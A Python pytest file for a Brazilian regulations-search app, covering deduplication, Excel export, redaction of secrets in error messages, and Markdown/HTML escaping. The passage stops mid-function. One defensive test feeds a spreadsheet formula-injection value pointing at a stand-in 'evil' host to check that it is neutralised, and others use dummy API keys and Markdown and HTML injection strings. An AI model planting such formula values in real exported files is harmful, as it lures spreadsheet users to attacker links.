"""Comprehensive tests for Phase 4: Deduplication and Excel Export.

Tests the deduplicator module (cross-source deduplication with three strategies)
and the excel_export module (formatted .xlsx generation via openpyxl).

Run from within levantamento-normativos/:
    python -m pytest test_phase4.py -v
"""

from __future__ import annotations

import hashlib
from io import BytesIO

import pytest
from openpyxl import load_workbook

from deduplicator import _normalize, _merge, deduplicate
from excel_export import generate_excel, COLUMNS, _MAX_EMENTA_LENGTH
from models import NormativoResult


# ---------------------------------------------------------------------------
# Helpers: factory functions for building test NormativoResult instances
# ---------------------------------------------------------------------------


def _make_result(
    nome: str = "Lei n. 13.709/2018",
    tipo: str = "Lei",
    numero: str = "13.709",
    data: str | None = "14/08/2018",
    orgao_emissor: str = "Presidencia da Republica",
    ementa: str = "Dispoe sobre a protecao de dados pessoais.",
    link: str = "https://www.planalto.gov.br/lei13709",
    source: str = "lexml",
    found_by: str = "LGPD",
    categoria: str = "Protecao de Dados",
    situacao: str = "Vigente",
    relevancia: float = 0.8,
) -> NormativoResult:
    """Shorthand factory that creates a NormativoResult with sensible defaults."""
    return NormativoResult(
        nome=nome,
        tipo=tipo,
        numero=numero,
        data=data,
        orgao_emissor=orgao_emissor,
        ementa=ementa,
        link=link,
        source=source,
        found_by=found_by,
        categoria=categoria,
        situacao=situacao,
        relevancia=relevancia,
    )


# ===========================================================================
#  DEDUPLICATOR TESTS
# ===========================================================================


class TestDeduplicatorExactIdMatch:
    """Strategy 1: Exact ID (SHA-256 of tipo|numero|data) match."""

    def test_same_tipo_numero_data_deduplicates_to_one(self):
        """Two results with identical tipo+numero+data produce the same ID
        and should be merged into a single output record."""
        r1 = _make_result(source="lexml", found_by="LGPD")
        r2 = _make_result(source="google", found_by="protecao dados")

        # Sanity: both have the same auto-generated ID
        assert r1.id == r2.id, "Precondition: IDs must match for this test"

        result = deduplicate([r1, r2])
        assert len(result) == 1, (
            f"Expected 1 result after dedup of exact ID match, got {len(result)}"
        )


class TestDeduplicatorTipoNumeroMatch:
    """Strategy 2: Tipo + Numero case-insensitive match."""

    def test_same_tipo_numero_different_data_merges(self):
        """Same tipo+numero but slightly different date should merge via
        Strategy 2 even though IDs differ."""
        r1 = _make_result(
            tipo="Instrucao Normativa", numero="65", data="10/01/2020",
            source="lexml", found_by="seguranca",
        )
        r2 = _make_result(
            tipo="Instrucao Normativa", numero="65", data="2020-01-10",
            source="tcu", found_by="auditoria",
        )

        # IDs differ because the raw data strings differ
        assert r1.id != r2.id, "Precondition: IDs must differ"

        result = deduplicate([r1, r2])
        assert len(result) == 1, (
            f"Expected 1 result after tipo+numero match, got {len(result)}"
        )

    def test_case_insensitive_tipo_match(self):
        """Tipo matching should be case-insensitive."""
        r1 = _make_result(tipo="LEI", numero="9999", data="01/01/2000", source="lexml")
        r2 = _make_result(tipo="lei", numero="9999", data="02/01/2000", source="tcu")

        assert r1.id != r2.id
        result = deduplicate([r1, r2])
        assert len(result) == 1


class TestDeduplicatorFuzzyEmentaMatch:
    """Strategy 3: Fuzzy ementa comparison via SequenceMatcher."""

    def test_very_similar_ementas_merge(self):
        """Two results with >85% similar ementas but different tipo/numero
        should be merged by fuzzy matching."""
        ementa_v1 = (
            "Dispoe sobre o tratamento de dados pessoais, inclusive nos "
            "meios digitais, por pessoa natural ou por pessoa juridica de "
            "direito publico ou privado, com o objetivo de proteger os "
            "direitos fundamentais de liberdade e de privacidade e o livre "
            "desenvolvimento da personalidade da pessoa natural."
        )
        # Very similar content with minor wording difference, yielding ratio > 0.85
        ementa_v2 = (
            "Dispoe sobre o tratamento de dados pessoais, inclusive nos "
            "meios digitais, por pessoa natural ou por pessoa juridica de "
            "direito publico ou privado, com o objetivo de proteger os "
            "direitos fundamentais de liberdade e de privacidade e o livre "
            "desenvolvimento da personalidade de pessoa natural."
        )

        r1 = _make_result(
            tipo="Lei", numero="13.709", ementa=ementa_v1,
            source="lexml", found_by="dados pessoais",
        )
        r2 = _make_result(
            tipo="Framework", numero="LGPD", ementa=ementa_v2,
            source="google", found_by="LGPD",
        )

        # Ensure they won't match on ID or tipo+numero
        assert r1.id != r2.id
        assert (r1.tipo.lower(), r1.numero.lower()) != (r2.tipo.lower(), r2.numero.lower())

        result = deduplicate([r1, r2])
        assert len(result) == 1, (
            f"Expected fuzzy match to merge similar ementas, got {len(result)} results"
        )


class TestDeduplicatorNoFalsePositives:
    """Genuinely different normativos must remain separate."""

    def test_different_normativos_stay_separate(self):
        """Two completely different normativos should not be merged."""
        r1 = _make_result(
            nome="Lei Geral de Protecao de Dados",
            tipo="Lei", numero="13.709", data="14/08/2018",
            ementa="Dispoe sobre a protecao de dados pessoais.",
            source="lexml",
        )
        r2 = _make_result(
            nome="Marco Civil da Internet",
            tipo="Lei", numero="12.965", data="23/04/2014",
            ementa="Estabelece principios, garantias, direitos e deveres "
                   "para o uso da Internet no Brasil.",
            source="lexml",
        )

        result = deduplicate([r1, r2])
        assert len(result) == 2, (
            f"Expected 2 distinct results, got {len(result)}"
        )


class TestDeduplicatorMergeLogic:
    """Verify that merged records combine the best metadata from both sources."""

    def test_source_is_combined(self):
        r1 = _make_result(source="lexml", found_by="LGPD")
        r2 = _make_result(source="google", found_by="LGPD")

        result = deduplicate([r1, r2])
        sources = set(s.strip() for s in result[0].source.split(","))
        assert "lexml" in sources
        assert "google" in sources

    def test_found_by_is_combined(self):
        r1 = _make_result(source="lexml", found_by="LGPD")
        r2 = _make_result(source="google", found_by="protecao dados")

        result = deduplicate([r1, r2])
        keywords = set(k.strip() for k in result[0].found_by.split(","))
        assert "LGPD" in keywords
        assert "protecao dados" in keywords

    def test_longer_ementa_is_kept(self):
        short_ementa = "Dispoe sobre dados pessoais."
        long_ementa = (
            "Dispoe sobre a protecao de dados pessoais, inclusive nos "
            "meios digitais, por pessoa natural ou por pessoa juridica."
        )
        r1 = _make_result(ementa=short_ementa, source="lexml")
        r2 = _make_result(ementa=long_ementa, source="google")

        result = deduplicate([r1, r2])
        assert result[0].ementa == long_ementa

    def test_higher_relevancia_is_kept(self):
        r1 = _make_result(relevancia=0.5, source="lexml")
        r2 = _make_result(relevancia=0.9, source="google")

        result = deduplicate([r1, r2])
        assert result[0].relevancia == 0.9

    def test_link_from_authoritative_source_preferred(self):
        """lexml link should be preferred over google link."""
        r1 = _make_result(
            source="google",
            link="https://google.com/result",
        )
        r2 = _make_result(
            source="lexml",
            link="https://lexml.gov.br/lei13709",
        )

        result = deduplicate([r1, r2])
        # After merge, source is combined (sorted alphabetically: "google, lexml").
        # The _merge function checks source priority AFTER updating source,
        # so the merged source string starts with "google" alphabetically.
        # The incoming (lexml, priority 0) has lower priority number than
        # the existing's first source in the combined string.
        # Let's just verify the link: lexml should win.
        # NOTE: There is a subtlety in the implementation -- after merge,
        # existing.source becomes "google, lexml" so existing_priority looks
        # up "google" (priority 2), incoming_priority looks up the incoming
        # source. But incoming.source is "lexml" so incoming_priority = 0.
        # Since 0 < 2, the incoming link wins. Good.
        assert result[0].link == "https://lexml.gov.br/lei13709"


class TestDeduplicatorEdgeCases:
    """Edge cases: empty list, single item, three-way merge."""

    def test_empty_list(self):
        assert deduplicate([]) == []

    def test_single_item(self):
        r1 = _make_result()
        result = deduplicate([r1])
        assert len(result) == 1
        assert result[0] is r1

    def test_three_way_merge(self):
        """Same normativo from all 3 sources should merge to 1 result."""
        r1 = _make_result(source="lexml", found_by="LGPD", relevancia=0.7)
        r2 = _make_result(source="tcu", found_by="dados pessoais", relevancia=0.8)
        r3 = _make_result(source="google", found_by="lei dados", relevancia=0.6)

        result = deduplicate([r1, r2, r3])
        assert len(result) == 1

        merged = result[0]
        sources = set(s.strip() for s in merged.source.split(","))
        assert sources == {"lexml", "tcu", "google"}

        keywords = set(k.strip() for k in merged.found_by.split(","))
        assert "LGPD" in keywords
        assert "dados pessoais" in keywords
        assert "lei dados" in keywords

        assert merged.relevancia == 0.8  # max of 0.7, 0.8, 0.6


class TestNormalizeHelper:
    """Tests for the _normalize() text normalization function."""

    def test_strips_accents(self):
        assert "regulamentacao" in _normalize("Regulamentação")

    def test_lowercases(self):
        assert _normalize("ABC DEF") == "abc def"

    def test_collapses_whitespace(self):
        assert _normalize("a   b\t\nc") == "a b c"

    def test_removes_punctuation(self):
        assert _normalize("lei (n. 13.709)") == "lei n 13709"

    def test_empty_string(self):
        assert _normalize("") == ""

    def test_none_like(self):
        # _normalize expects a string; empty string is the None guard
        assert _normalize("") == ""


# ===========================================================================
#  EXCEL EXPORT TESTS
# ===========================================================================


def _load_workbook_from_buffer(buf: BytesIO):
    """Helper: load an openpyxl Workbook from a generate_excel buffer."""
    return load_workbook(BytesIO(buf.getvalue()))


def _make_sample_results(count: int = 3) -> list[NormativoResult]:
    """Create a list of distinct NormativoResult objects for Excel tests."""
    samples = [
        _make_result(
            nome="Lei n. 13.709/2018 - LGPD",
            tipo="Lei", numero="13.709", data="14/08/2018",
            ementa="Dispoe sobre a protecao de dados pessoais.",
            link="https://www.planalto.gov.br/lei13709",
            source="lexml", relevancia=0.85,
        ),
        _make_result(
            nome="Decreto n. 10.332/2020",
            tipo="Decreto", numero="10.332", data="28/04/2020",
            ementa="Institui a Estrategia de Governo Digital.",
            link="https://www.planalto.gov.br/decreto10332",
            source="tcu", relevancia=0.6,
        ),
        _make_result(
            nome="IN SGD/ME n. 1/2019",
            tipo="Instrucao Normativa", numero="1", data="04/04/2019",
            ementa="Dispoe sobre o processo de contratacao de TIC.",
            link="https://www.gov.br/in1-2019",
            source="google", relevancia=0.3,
        ),
    ]
    return samples[:count]


class TestExcelBasicExport:
    """Basic Excel generation and format verification."""

    def test_basic_export_produces_valid_xlsx(self):
        """Generated buffer should start with PK (zip/xlsx magic bytes)."""
        results = _make_sample_results(3)
        buf = generate_excel(results, "Governanca de TI")

        raw = buf.getvalue()
        assert raw[:2] == b"PK", (
            f"Expected xlsx magic bytes PK, got {raw[:2]!r}"
        )

    def test_basic_export_has_correct_row_count(self):
        """3 results -> row 1 (title) + row 2 (header) + 3 data rows = 5 rows."""
        results = _make_sample_results(3)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        # max_row should be 5 (title + header + 3 data)
        assert ws.max_row == 5, f"Expected 5 rows, got {ws.max_row}"

    def test_title_row_contains_topic(self):
        results = _make_sample_results(1)
        buf = generate_excel(results, "Seguranca da Informacao")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        title = ws.cell(row=1, column=1).value
        assert "Seguranca da Informacao" in title

    def test_sheet_name(self):
        results = _make_sample_results(1)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        assert wb.active.title == "Normativos"


class TestExcelEmptyList:
    """generate_excel with empty results list."""

    def test_empty_list_returns_valid_xlsx(self):
        """The actual implementation returns a valid workbook with headers only
        (no ValueError is raised despite the spec suggesting otherwise)."""
        buf = generate_excel([], "test")
        raw = buf.getvalue()
        assert raw[:2] == b"PK", "Empty list should still produce valid xlsx"

    def test_empty_list_has_header_row(self):
        buf = generate_excel([], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        # Row 2 should have header values
        header_val = ws.cell(row=2, column=1).value
        assert header_val == "Nome do Normativo"


class TestExcelHyperlinks:
    """Verify the link column contains hyperlink formatting."""

    def test_link_column_has_hyperlink(self):
        results = _make_sample_results(1)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        # Link is column 7 (index in COLUMNS)
        link_cell = ws.cell(row=3, column=7)
        assert link_cell.value == results[0].link
        assert link_cell.hyperlink is not None, "Link cell should have a hyperlink"
        # Hyperlink target should match the URL
        hyperlink_target = link_cell.hyperlink.target
        assert hyperlink_target == results[0].link, (
            f"Hyperlink target {hyperlink_target!r} != expected {results[0].link!r}"
        )


class TestExcelColumnCount:
    """Verify all 11 expected columns are present."""

    def test_has_11_columns(self):
        assert len(COLUMNS) == 11, f"Expected 11 column definitions, got {len(COLUMNS)}"

    def test_header_row_has_10_columns(self):
        results = _make_sample_results(1)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        headers = []
        for col in range(1, 12):
            val = ws.cell(row=2, column=col).value
            if val:
                headers.append(val)

        assert len(headers) == 11, f"Expected 11 headers, got {len(headers)}: {headers}"

    def test_expected_header_names(self):
        expected = [
            "Nome do Normativo", "Tipo", "Numero", "Data", "Orgao Emissor",
            "Ementa", "Link", "Categoria/Tema", "Situacao", "Relevancia",
            "Origem da nota",
        ]
        results = _make_sample_results(1)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        actual = [ws.cell(row=2, column=c).value for c in range(1, 12)]
        assert actual == expected, f"Header mismatch: {actual}"


class TestExcelLargeEmenta:
    """NormativoResult with a very long ementa should be truncated."""

    def test_6000_char_ementa_is_truncated(self):
        long_ementa = "A" * 6000
        r = _make_result(ementa=long_ementa)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        ementa_cell = ws.cell(row=3, column=6)  # Ementa is column 6
        cell_value = ementa_cell.value

        # Should be truncated to _MAX_EMENTA_LENGTH + "..."
        assert len(cell_value) == _MAX_EMENTA_LENGTH + 3, (
            f"Expected truncated length {_MAX_EMENTA_LENGTH + 3}, got {len(cell_value)}"
        )
        assert cell_value.endswith("..."), "Truncated ementa should end with '...'"

    def test_short_ementa_is_not_truncated(self):
        short = "Dispoe sobre dados pessoais."
        r = _make_result(ementa=short)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active

        assert ws.cell(row=3, column=6).value == short


class TestExcelSpecialCharacters:
    """Ementas with accents, quotes, and newlines should not crash export."""

    def test_accented_characters(self):
        ementa = "Regulamentação sobre proteção de dados — incluindo ações específicas."
        r = _make_result(ementa=ementa)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=6).value == ementa

    def test_quotes_and_special_chars(self):
        ementa = 'Dispõe sobre "normas" de \'segurança\' & governança <TI>.'
        r = _make_result(ementa=ementa)
        # Should not raise
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=6).value == ementa

    def test_newlines_in_ementa(self):
        ementa = "Linha 1.\nLinha 2.\nLinha 3."
        r = _make_result(ementa=ementa)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=6).value == ementa

    def test_mixed_unicode(self):
        ementa = "§ 1° — Art. 5°, inciso XII, da Constituição Federal de 1988."
        r = _make_result(ementa=ementa)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=6).value == ementa


class TestExcelDataValues:
    """Round-trip verification: values written match values read back."""

    def test_nome_value(self):
        r = _make_result(nome="Lei n. 13.709/2018 - LGPD")
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=1).value == "Lei n. 13.709/2018 - LGPD"

    def test_tipo_value(self):
        r = _make_result(tipo="Instrucao Normativa")
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=2).value == "Instrucao Normativa"

    def test_relevancia_is_numeric(self):
        r = _make_result(relevancia=0.85)
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        val = ws.cell(row=3, column=10).value
        assert isinstance(val, float), f"Relevancia should be float, got {type(val)}"
        assert abs(val - 0.85) < 0.001

    def test_date_formatting_iso_to_ddmmyyyy(self):
        """ISO date input (2020-04-28) should be formatted as 28/04/2020."""
        r = _make_result(data="2020-04-28")
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=4).value == "28/04/2020"

    def test_date_already_ddmmyyyy(self):
        r = _make_result(data="14/08/2018")
        buf = generate_excel([r], "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.cell(row=3, column=4).value == "14/08/2018"


class TestExcelFreezePanes:
    """Verify freeze panes are set correctly."""

    def test_freeze_at_a3(self):
        results = _make_sample_results(1)
        buf = generate_excel(results, "test")
        wb = _load_workbook_from_buffer(buf)
        ws = wb.active
        assert ws.freeze_panes == "A3", (
            f"Expected freeze_panes='A3', got {ws.freeze_panes!r}"
        )


# ===========================================================================
#  FRENTE 2 — VOCABULARIO DE HONESTIDADE (spec 2026-09-22 §3.1, plano v2 T1)
# ===========================================================================

from models import (KeywordStatus, MOTIVOS, ORIGENS_RELEVANCIA, redigir,
                    statuses_para_falha_total)


class TestVocabularioHonestidade:
    def test_motivos_fechados(self):
        assert MOTIVOS == frozenset({
            "", "bloqueio_waf", "http_5xx", "http_4xx", "rate_limit", "manutencao_503",
            "timeout", "conexao", "resposta_ilegivel", "endpoint_inexistente",
            "nao_consultada", "erro_interno",
        })

    def test_origens_fechadas(self):
        assert ORIGENS_RELEVANCIA == frozenset({"modelo", "heuristica", "fallback_erro", "padrao_fonte"})

    def test_keyword_status_construtor_antigo_continua_valido(self):
        s = KeywordStatus(keyword="lgpd", source="lexml", result_count=0, status="empty")
        assert (s.motivo, s.detalhe, s.parcial) == ("", "", False)

    def test_keyword_status_aceita_motivo_valido(self):
        s = KeywordStatus(keyword="lgpd", source="lexml", status="error",
                          motivo="bloqueio_waf", detalhe="HTTP 200 text/html")
        assert s.motivo == "bloqueio_waf"

    def test_keyword_status_rejeita_motivo_inventado(self):
        with pytest.raises(ValueError, match="motivo"):
            KeywordStatus(keyword="lgpd", source="lexml", status="error", motivo="waf")

    def test_keyword_status_redige_detalhe_e_error_message(self):
        s = KeywordStatus(keyword="k", source="google", status="error", motivo="http_4xx",
                          detalhe="GET https://g/api?key=AIzaSECRET&cx=abc&q=x -> 403",
                          error_message="500 for url: https://g/x?key=AIzaSECRET")
        assert "AIzaSECRET" not in s.detalhe and "key=***" in s.detalhe
        assert "AIzaSECRET" not in s.error_message

    def test_keyword_status_redige_tambem_na_mutacao_pos_construcao(self):
        """R2-H1: os retries mutam error_message/detalhe depois do construtor."""
        s = KeywordStatus(keyword="k", source="google", status="error", motivo="http_5xx")
        s.error_message = "Retry failed: 500 for url: https://g/x?key=AIzaSECRET"
        s.detalhe = "GET https://g/x?cx=SEGREDO -> 500"
        assert "AIzaSECRET" not in s.error_message and "SEGREDO" not in s.detalhe

    def test_normativo_origem_default_e_padrao_fonte(self):
        assert _make_result().relevancia_origem == "padrao_fonte"

    def test_normativo_rejeita_origem_inventada(self):
        with pytest.raises(ValueError, match="relevancia_origem"):
            NormativoResult(nome="x", tipo="Lei", numero="1", data=None, orgao_emissor="",
                            ementa="", link="", source="lexml", found_by="k",
                            relevancia_origem="ia")

    def test_fonte_indisponivel_motivo_desconhecido_vira_erro_interno_e_str_dinamico(self):
        from searchers.base import FonteIndisponivel
        e = FonteIndisponivel("http5xx", "GET x -> 500")
        assert (e.motivo, "http5xx" in e.detalhe) == ("erro_interno", True)
        e.detalhe = "novo"
        assert str(e) == "erro_interno: novo"


class TestRedigir:
    def test_redige_segredos_em_query_e_bearer(self):
        assert redigir("u?key=ABC&cx=DEF&api_key=GHI&token=JKL&access_token=MNO&client_secret=PQR&q=x") == \
            "u?key=***&cx=***&api_key=***&token=***&access_token=***&client_secret=***&q=x"
        assert redigir("Authorization: Bearer eyJabc.def") == "Authorization: Bearer ***"

    def test_remove_controle_e_corta_no_meio_com_marcador(self):
        assert redigir("a\x00b\x07c\n") == "abc\n"
        assert len(redigir("x" * 1500)) == 1500
        cortado = redigir("A" * 1990 + " | GET https://fonte/x | retry pulado")
        assert len(cortado) <= 2000 and "[…cortado" in cortado          # R3: sufixo (URL, 'retry pulado') sobrevive
        assert cortado.startswith("AAAA") and cortado.endswith("| retry pulado")

    def test_neutraliza_so_formula(self):
        assert redigir('=HYPERLINK("http://evil","clique")').startswith("'=")
        assert redigir("-1") == "-1" and redigir("+1") == "+1" and redigir("@x") == "@x"   # openpyxl so trata '=' como formula

    def test_texto_normal_intacto(self):
        assert redigir("GET https://x/y?q=lgpd -> 200 text/html") == "GET https://x/y?q=lgpd -> 200 text/html"


class TestRotuloStatus:
    def test_rotulos(self):
        from models import rotulo_status
        mk = lambda **k: KeywordStatus(keyword="k", source="lexml", **k)
        assert rotulo_status(mk(status="ok")) == "OK"
        assert rotulo_status(mk(status="empty")) == "Sem resultado"
        assert rotulo_status(mk(status="error", motivo="bloqueio_waf")) == "Indisponível"
        assert rotulo_status(mk(status="error", motivo="nao_consultada")) == "Não consultada"   # R2-B6


class TestStatusesParaFalhaTotal:
    def test_um_status_por_keyword(self):
        sts = statuses_para_falha_total("tcu", ["a", "b"], AttributeError("'int' object has no attribute 'strip'"))
        assert [s.keyword for s in sts] == ["a", "b"]
        assert all((s.source, s.status, s.motivo) == ("tcu", "error", "erro_interno") for s in sts)
        assert "AttributeError" in sts[0].detalhe and "strip" in sts[0].detalhe

    def test_lista_vazia_de_keywords_da_um_status_generico(self):
        sts = statuses_para_falha_total("lexml", [], RuntimeError("x"))
        assert len(sts) == 1 and sts[0].keyword == "(todas)"


class TestMergeOrigem:
    """_merge guarda a maior nota E a origem dela (spec §3.4). Invariante: no app o
    dedup roda ANTES da pontuacao, entao hoje o efeito e nulo — ver docstring."""

    def test_incoming_maior_leva_sua_origem(self):
        a = _make_result(relevancia=0.4); a.relevancia_origem = "padrao_fonte"
        b = _make_result(source="google", relevancia=0.9); b.relevancia_origem = "modelo"
        _merge(a, b)
        assert (a.relevancia, a.relevancia_origem) == (0.9, "modelo")

    def test_existing_maior_mantem_sua_origem(self):
        a = _make_result(relevancia=0.9); a.relevancia_origem = "heuristica"
        b = _make_result(source="google", relevancia=0.2); b.relevancia_origem = "modelo"
        _merge(a, b)
        assert (a.relevancia, a.relevancia_origem) == (0.9, "heuristica")

    def test_empate_mantem_existing(self):
        a = _make_result(relevancia=0.5); a.relevancia_origem = "modelo"
        b = _make_result(source="google", relevancia=0.5); b.relevancia_origem = "fallback_erro"
        _merge(a, b)
        assert a.relevancia_origem == "modelo"


from models import KeywordStatus as _KS, rotulo_status
from excel_export import ORIGEM_LABEL, VAZIO, DIAGNOSTICO_SHEET


class TestExcelHonestidade:
    def test_origem_em_portugues_na_coluna_11(self):
        r = _make_result(relevancia=0.85); r.relevancia_origem = "heuristica"
        ws = _load_workbook_from_buffer(generate_excel([r], "t")).active
        assert ws.cell(row=2, column=11).value == "Origem da nota"
        assert ws.cell(row=3, column=11).value == "Heurística (palavras-chave)"

    def test_default_padrao_fonte(self):
        ws = _load_workbook_from_buffer(generate_excel([_make_result()], "t")).active
        assert ws.cell(row=3, column=11).value == "Padrão da fonte"

    def test_aba_diagnostico_sempre_existe_e_normativos_continua_ativa(self):
        wb = _load_workbook_from_buffer(generate_excel([_make_result()], "t"))
        assert wb.sheetnames == ["Normativos", DIAGNOSTICO_SHEET]
        assert wb.active.title == "Normativos"
        assert wb[DIAGNOSTICO_SHEET].cell(row=3, column=1).value == "Nenhum diagnóstico registrado nesta exportação"

    def test_aba_diagnostico_lista_vazia_igual_a_none(self):
        a = _load_workbook_from_buffer(generate_excel([_make_result()], "t", diagnostico=None))[DIAGNOSTICO_SHEET]
        b = _load_workbook_from_buffer(generate_excel([_make_result()], "t", diagnostico=[]))[DIAGNOSTICO_SHEET]
        assert a.cell(row=3, column=1).value == b.cell(row=3, column=1).value

    def test_aba_diagnostico_uma_linha_por_status_com_traco_no_vazio(self):
        diag = [
            _KS(keyword="lgpd", source="lexml", status="error", motivo="bloqueio_waf",
                detalhe="HTTP 200 text/html; título: x | GET http://x", error_message="bloqueio"),
            _KS(keyword="lgpd", source="tcu", status="ok", result_count=4, parcial=True,
                detalhe="pagina 2 (inicio=20): http_5xx: HTTP 500 | GET http://y"),
            _KS(keyword="lgpd", source="google", status="empty"),
            _KS(keyword="outra", source="lexml", status="error", motivo="nao_consultada",
                detalhe="busca parou em max_results=50 antes desta palavra-chave"),
        ]
        wb = _load_workbook_from_buffer(generate_excel([_make_result()], "t", diagnostico=diag, quando="22/09/2026 10:00"))
        ws = wb[DIAGNOSTICO_SHEET]
        assert "22/09/2026 10:00" in ws.cell(row=1, column=1).value
        assert [ws.cell(row=2, column=c).value for c in range(1, 9)] == [
            "Fonte", "Palavra-chave", "Status", "Motivo", "Detalhe", "Resultados", "Parcial", "Retentado"]
        linhas = [[ws.cell(row=r, column=c).value for c in range(1, 9)] for r in range(3, 7)]
        assert linhas[0] == ["lexml", "lgpd", "Indisponível", "bloqueio_waf", "HTTP 200 text/html; título: x | GET http://x", 0, "Não", "Não"]
        assert linhas[1] == ["tcu", "lgpd", "OK", VAZIO, "pagina 2 (inicio=20): http_5xx: HTTP 500 | GET http://y", 4, "Sim", "Não"]
        assert linhas[2] == ["google", "lgpd", "Sem resultado", VAZIO, VAZIO, 0, "Não", "Não"]
        assert linhas[3][2:4] == ["Não consultada", "nao_consultada"]            # R2-B6
        assert ws.cell(row=7, column=1).value is None

    def test_rotulo_da_planilha_e_o_de_models(self):
        diag = [_KS(keyword="k", source="tcu", status="error", motivo="http_5xx")]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        assert ws.cell(row=3, column=3).value == rotulo_status(diag[0]) == "Indisponível"

    def test_sem_quando_o_titulo_diz_nao_informada(self):
        ws = _load_workbook_from_buffer(generate_excel([], "t"))[DIAGNOSTICO_SHEET]
        assert "data/hora não informada" in ws.cell(row=1, column=1).value      # R2-B5: informadA

    def test_detalhe_longo_cabe_na_celula_inteiro(self):
        longo = "HTTP 500; " + "x" * 1500 + " | GET http://z"
        diag = [_KS(keyword="k", source="lexml", status="error", motivo="http_5xx", detalhe=longo)]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        assert ws.cell(row=3, column=5).value == longo                          # R2-B1: nada cortado


class TestRotulosSincronizados:
    def test_origem_label_cobre_o_vocabulario(self):
        assert set(ORIGEM_LABEL) == ORIGENS_RELEVANCIA

    def test_status_label_vem_de_models(self):
        from excel_export import STATUS_LABEL
        assert STATUS_LABEL is rotulo_status   # unico lugar (R2-B6)

    def test_origem_curta_do_app_cobre_o_vocabulario(self):
        # Fica aqui, nao como assert no app: assert some com python -O (R3).
        from app import ORIGEM_CURTA
        assert set(ORIGEM_CURTA) == ORIGENS_RELEVANCIA


# ---------------------------------------------------------------------------
# T9 (item carregado da T2/T3): escape da tela. st.markdown sem
# unsafe_allow_html NAO interpreta HTML, mas interpreta Markdown; html.escape
# dentro de code span mostrava "&#x27;" / "&lt;!DOCTYPE" literal na tela.
# Proxy sem navegador: renderizar com CommonMark (markdown-it-py, que ja vem
# com o streamlit via rich) e conferir que o texto VISIVEL e o original. O
# pipeline do Streamlit (remark) segue o mesmo CommonMark nos escapes; a
# prova na tela fica no e2e (gate V11 / testador).
# ---------------------------------------------------------------------------

_AMOSTRAS_TELA = [
    "d'água",
    'HTTP 200 text/html; corpo: <!DOCTYPE html><html lang="pt-br">',
    "**negrito** _italico_ [link](http://e.x) :red[cor] ![img](http://t.x/p.png)",
    "a & b &amp; c &#x27; d",
    "Lei 8.666/93 - art. 5º | GET https://lexml.gov.br/busca/SRU?query=a%20b&x=1",
    "1. lista? # titulo $x$ ~risco~ `crase` ``duas``",
]


def _texto_visivel(html_renderizado: str) -> str:
    import html as _html
    import re as _re_t
    return _html.unescape(_re_t.sub(r"<[^>]+>", "", html_renderizado)).strip()


class TestEscapeDaTela:
    def test_md_texto_mostra_o_texto_literal_sem_formatar(self):
        MarkdownIt = pytest.importorskip("markdown_it").MarkdownIt
        from app import _md_texto
        md = MarkdownIt("commonmark", {"html": False})
        for texto in _AMOSTRAS_TELA:
            html_out = md.render(_md_texto(texto))
            assert _texto_visivel(html_out) == texto, texto      # nenhuma entidade na tela
            for tag in ("<strong", "<em", "<a ", "<img", "<code", "<h1", "<ol", "<del"):
                assert tag not in html_out, (tag, texto)         # nada formatou/injetou

    def test_md_codigo_mostra_o_texto_literal_no_code_span(self):
        import html as _html
        MarkdownIt = pytest.importorskip("markdown_it").MarkdownIt
        from app import _md_codigo
        md = MarkdownIt("commonmark", {"html": False})
        for texto in _AMOSTRAS_TELA:
            html_out = md.render(_md_codigo(texto))
            assert html_out.count("<code>") == 1, texto          # uma crase no texto nao fecha o span
            assert _texto_visivel(html_out) == texto, texto
            if any(c in texto for c in "'\"<&"):                 # o padrao antigo mostrava a entidade
                antigo = _texto_visivel(md.render(f"`{_html.escape(texto)}`"))
                assert antigo != texto, texto

    def test_md_html_no_card_mostra_o_texto_da_fonte_literal(self):
        # Review da T9, F1: o card usa unsafe_allow_html=True — ali o HTML E
        # interpretado E o Markdown tambem. "R$ 1.000,00 a R$ 5.000,00" virava
        # LaTeX (os $ sumiam), "*caput*" italico: o texto normativo mudava na tela.
        MarkdownIt = pytest.importorskip("markdown_it").MarkdownIt
        from app import _md_html
        md = MarkdownIt("commonmark", {"html": True})
        for texto in ["R$ 1.000,00 a R$ 5.000,00", "*caput*", "a &amp; b", "<b>x</b>", "d'a",
                      "__x__ [a](http://b.c) :red[x]"] + _AMOSTRAS_TELA:
            html_out = md.render(f"<span>{_md_html(texto)}</span>")
            assert _texto_visivel(html_out) == texto, texto      # sem entidade dobrada (\&amp;)
            for tag in ("<b>", "<em", "<strong", "<a ", "<img", "<code"):
                assert tag not in html_out, (tag, texto)


def _apptest_passo4(kw_statuses, results=()):
    """Roda o app de verdade (AppTest, sem rede) direto no Passo 4."""
    from streamlit.testing.v1 import AppTest
